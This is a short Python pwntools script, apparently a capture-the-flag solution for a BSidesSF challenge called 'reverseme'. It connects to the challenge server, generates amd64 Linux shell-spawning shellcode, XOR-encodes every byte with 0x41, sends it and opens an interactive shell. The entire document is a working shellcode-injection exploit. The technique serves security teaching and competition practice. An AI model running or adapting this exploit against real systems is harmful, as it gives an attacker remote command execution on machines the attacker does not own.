from pwn import *

context.update(log_level = 'debug', arch='amd64', os='linux')

#p = process('reverseme')
p = remote('reverseme-53b7d3aa.challenges.bsidessf.net', 1339)

p.recvline()


shellcode = asm(shellcraft.amd64.linux.sh())
xor_code = ''

for x in shellcode:
    xor_code += chr(int(x.encode('hex'),16)^0x41)

p.sendline(xor_code)
p.interactive()
